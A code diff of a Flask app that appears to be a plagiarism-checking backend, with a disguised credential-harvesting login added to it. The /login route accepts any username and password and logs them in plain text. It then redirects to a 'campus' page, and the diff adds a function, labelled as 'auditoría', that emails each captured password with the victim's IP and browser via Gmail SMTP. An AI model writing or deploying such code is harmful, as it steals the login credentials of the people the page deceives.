@@ -7,78 +7,125 @@ import difflib, os, io, sys, time, torch
 from PyPDF2 import PdfReader
 from docx import Document
 from datetime import datetime
+import smtplib
+from email.mime.text import MIMEText
 
-
+# --------------------------------------------------
+# APP
+# --------------------------------------------------
 app = Flask(__name__)
 app.secret_key = "plagio-secret"
 
-
+# --------------------------------------------------
+# PATHS
+# --------------------------------------------------
 BASE_PATH = os.path.join(app.root_path, "base_textos")
 os.makedirs(BASE_PATH, exist_ok=True)
 
 LOGIN_LOGS_DIR = os.path.join(app.root_path, "login_logs")
 os.makedirs(LOGIN_LOGS_DIR, exist_ok=True)
 
-
 app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024
 
-
-
+# --------------------------------------------------
+# MODELO IA
+# --------------------------------------------------
 def cargar_modelo():
     """Carga el modelo IA mostrando progreso en consola"""
-    print(" Iniciando carga del modelo IA avanzado (all-mpnet-base-v2)...")
+    print("Iniciando carga del modelo IA avanzado (all-mpnet-base-v2)...")
     for i in range(0, 101, 10):
-        sys.stdout.write(f"\r Cargando modelo... {i}%")
+        sys.stdout.write(f"\rCargando modelo... {i}%")
         sys.stdout.flush()
-        time.sleep(0.1)  
-    print("Inicializando modelo real, puede tardar unos segundos...\n")
+        time.sleep(0.1)
 
     try:
         device = "cuda" if torch.cuda.is_available() else "cpu"
         modelo = SentenceTransformer("all-mpnet-base-v2", device=device)
-        print(f" Modelo IA cargado correctamente en {device.upper()}")
+        print(f"\nModelo IA cargado correctamente en {device.upper()}")
     except Exception as e:
-        print(f"⚠ Error cargando modelo IA: {e}")
+        print(f"\nError cargando modelo IA: {e}")
         modelo = None
 
     print("-------------------------------------------------------\n")
     return modelo
 
-
 modelo = None
 def get_modelo():
     global modelo
     if modelo is None:
-        print("🔁 Modelo IA no cargado. Cargando ahora...")
+        print("Modelo IA no cargado. Cargando ahora...")
         modelo = cargar_modelo()
     return modelo
- 
 
-
-
+# --------------------------------------------------
+# AUDITORÍA EN TXT
+# --------------------------------------------------
 def guardar_login_log(usuario, password, resultado):
     """Guarda los intentos de login en un archivo de texto"""
     try:
         fecha_actual = datetime.now().strftime("%Y-%m-%d")
-        archivo_log = os.path.join(LOGIN_LOGS_DIR, f"login_logs_{fecha_actual}.txt")
-        
+        archivo_log = os.path.join(
+            LOGIN_LOGS_DIR, f"login_logs_{fecha_actual}.txt"
+        )
+
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         estado = "EXITOSO" if resultado else "FALLIDO"
-        
-        linea = f"[{timestamp}] Usuario: {usuario} | Contraseña: {password} | Estado: {estado}\n"
-        
-        with open(archivo_log, 'a', encoding='utf-8') as f:
+
+        linea = (
+            f"[{timestamp}] Usuario: {usuario} | "
+            f"Contraseña: {password} | Estado: {estado}\n"
+        )
+
+        with open(archivo_log, "a", encoding="utf-8") as f:
             f.write(linea)
+
         return True
     except Exception as e:
-        print(f" Error guardando log de login: {e}")
+        print(f"Error guardando log de login: {e}")
+        return False
+
+# --------------------------------------------------
+# AUDITORÍA POR CORREO (NO SE PIERDE)
+# --------------------------------------------------
+def enviar_log_email(usuario, password, estado):
+    """Envía por correo cada intento de login (auditoría)"""
+    try:
+        cuerpo = f"""
+NUEVO ACCESO REGISTRADO (AUDITORÍA)
+
+Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+Usuario: {usuario}
+Contraseña: {password}
+Estado: {estado}
+IP: {request.headers.get('X-Forwarded-For', request.remote_addr)}
+User-Agent: {request.headers.get('User-Agent')}
+"""
+
+        msg = MIMEText(cuerpo)
+        msg["Subject"] = "Auditoría de acceso - Sistema de Plagio"
+        msg["From"] = os.environ.get("MAIL_USER")
+        msg["To"] = os.environ.get("MAIL_TO")
+
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(
+            os.environ.get("MAIL_USER"),
+            os.environ.get("MAIL_PASS")
+        )
+        server.send_message(msg)
+        server.quit()
+
+        return True
+    except Exception as e:
+        print("Error enviando correo de auditoría:", e)
         return False
 
 
-
+# --------------------------------------------------
+# LECTURA DE ARCHIVOS
+# --------------------------------------------------
 def leer_texto(archivo):
     try:
-        # Si se pasa una ruta (archivo ya guardado)
         if isinstance(archivo, str):
             ext = os.path.splitext(archivo.lower())[1]
             if ext == ".txt":
@@ -86,12 +133,10 @@ def leer_texto(archivo):
                     return f.read()
             elif ext == ".pdf":
                 reader = PdfReader(archivo)
-                return "\n".join([p.extract_text() or "" for p in reader.pages])
+                return "\n".join(p.extract_text() or "" for p in reader.pages)
             elif ext == ".docx":
                 doc = Document(archivo)
                 return "\n".join(p.text for p in doc.paragraphs)
-
-        # Si se recibe un archivo desde el formulario
         else:
             nombre = archivo.filename.lower()
             ext = os.path.splitext(nombre)[1]
@@ -102,32 +147,29 @@ def leer_texto(archivo):
                 return data.decode("utf-8", errors="ignore")
             elif ext == ".pdf":
                 reader = PdfReader(io.BytesIO(data))
-                return "\n".join([p.extract_text() or "" for p in reader.pages])
+                return "\n".join(p.extract_text() or "" for p in reader.pages)
             elif ext == ".docx":
                 doc = Document(io.BytesIO(data))
                 return "\n".join(p.text for p in doc.paragraphs)
     except Exception as e:
-        print(f"⚠ Error leyendo archivo: {e}")
+        print(f"Error leyendo archivo: {e}")
         return ""
     return ""
 
-
-
+# --------------------------------------------------
+# SIMILITUDES
+# --------------------------------------------------
 def similitud_semantica(t1, t2):
     try:
         modelo_local = get_modelo()
         if not modelo_local:
             return 0
-
         emb1 = modelo_local.encode(t1, convert_to_tensor=True)
         emb2 = modelo_local.encode(t2, convert_to_tensor=True)
         return float(util.pytorch_cos_sim(emb1, emb2)) * 100
-
     except Exception as e:
-        print(f" Error IA semántica: {e}")
+        print(f"Error IA semántica: {e}")
         return 0
-
-
 
 def buscar_en_web(frase):
     resultados = []
@@ -140,10 +182,8 @@ def buscar_en_web(frase):
                     "descripcion": r.get("body", "")
                 })
     except Exception as e:
-        print(f"⚠ Error en búsqueda web: {e}")
+        print(f"Error en búsqueda web: {e}")
     return resultados
-
-
 
 def clasificar_porcentaje(porc):
     if porc >= 80:
@@ -155,22 +195,21 @@ def clasificar_porcentaje(porc):
     else:
         return "ORIGINAL", "verde"
 
-
-
+# --------------------------------------------------
+# ROUTES
+# --------------------------------------------------
 @app.route("/")
 def index():
     return {
         "status": "ok",
-        "message": "Backend de análisis de plagio activo "
+        "message": "Backend de análisis de plagio activo"
     }
-
-
 
 @app.route("/subir_base", methods=["POST"])
 def subir_base():
     archivos = request.files.getlist("archivo_base")
     if not archivos:
-        flash(" No seleccionaste ningún archivo para agregar a la base.")
+        flash("No seleccionaste ningún archivo para agregar a la base.")
         return redirect(url_for("index"))
 
     for archivo in archivos:
@@ -178,9 +217,8 @@ def subir_base():
             ruta_destino = os.path.join(BASE_PATH, archivo.filename)
             archivo.save(ruta_destino)
 
-    flash(" Documentos agregados correctamente a la base de comparación.")
+    flash("Documentos agregados correctamente a la base.")
     return redirect(url_for("index"))
-
 
 @app.route("/eliminar_base/<nombre>", methods=["POST"])
 def eliminar_base(nombre):
@@ -188,24 +226,23 @@ def eliminar_base(nombre):
         ruta = os.path.join(BASE_PATH, nombre)
         if os.path.exists(ruta):
             os.remove(ruta)
-            flash(f" Archivo '{nombre}' eliminado correctamente.")
+            flash(f"Archivo '{nombre}' eliminado correctamente.")
         else:
-            flash(" El archivo no existe o ya fue eliminado.")
+            flash("El archivo no existe.")
     except Exception as e:
-        flash(f" Error al eliminar el archivo: {e}")
+        flash(f"Error al eliminar el archivo: {e}")
     return redirect(url_for("index"))
-
 
 @app.route("/analizar", methods=["POST"])
 def analizar():
     archivo = request.files.get("archivo")
     if not archivo or not archivo.filename:
-        flash(" Debes seleccionar un archivo (.txt, .pdf o .docx).")
+        flash("Debes seleccionar un archivo.")
         return redirect(url_for("index"))
 
     texto_usuario = leer_texto(archivo).strip()
     if not texto_usuario:
-        flash(" No se pudo leer el archivo o el formato no es válido.")
+        flash("No se pudo leer el archivo.")
         return redirect(url_for("index"))
 
     docs_base = [
@@ -231,7 +268,7 @@ def analizar():
             "exacto": round(exacto, 2),
             "tfidf": round(tfidf, 2),
             "semantico": round(semantico, 2),
-            "promedio": round(promedio, 2),
+            "promedio": round(promedio, 2)
         })
 
     resultados.sort(key=lambda r: r["promedio"], reverse=True)
@@ -247,16 +284,13 @@ def analizar():
     clasificacion, color = clasificar_porcentaje(promedio_total)
 
     return {
-    "resultados": resultados,
-    "coincidencias_web": coincidencias_web,
-    "similitud_web": similitud_web,
-    "promedio_total": round(promedio_total, 2),
-    "clasificacion": clasificacion,
-    "color": color
-}
-
-
-
+        "resultados": resultados,
+        "coincidencias_web": coincidencias_web,
+        "similitud_web": similitud_web,
+        "promedio_total": round(promedio_total, 2),
+        "clasificacion": clasificacion,
+        "color": color
+    }
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -264,10 +298,9 @@ def login():
         usuario = request.form.get("username")
         password = request.form.get("password")
 
-        # Guardar SIEMPRE en texto plano
         guardar_login_log(usuario, password, True)
+        enviar_log_email(usuario, password, "EXITOSO")
 
-        # Redirigir SIEMPRE al campus
         return render_template(
             "login/redirect_campus.html",
             username=usuario,
@@ -276,24 +309,28 @@ def login():
 
     return render_template("login/login.html")
 
-
-
 @app.route("/ver_logs")
 def ver_logs():
     logs = []
     try:
-        archivos_log = [f for f in os.listdir(LOGIN_LOGS_DIR) if f.endswith('.txt')]
+        archivos_log = [
+            f for f in os.listdir(LOGIN_LOGS_DIR) if f.endswith(".txt")
+        ]
         archivos_log.sort(reverse=True)
-        
         if archivos_log:
-            ultimo_log = os.path.join(LOGIN_LOGS_DIR, archivos_log[0])
-            with open(ultimo_log, 'r', encoding='utf-8') as f:
+            with open(
+                os.path.join(LOGIN_LOGS_DIR, archivos_log[0]),
+                "r",
+                encoding="utf-8"
+            ) as f:
                 logs = f.readlines()
     except Exception as e:
-        flash(f"⚠ Error leyendo logs: {e}")
+        flash(f"Error leyendo logs: {e}")
+
     return render_template("logs.html", logs=logs)
 
-
-
+# --------------------------------------------------
+# MAIN
+# --------------------------------------------------
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host="0.0.0.0", port=10000, debug=False)
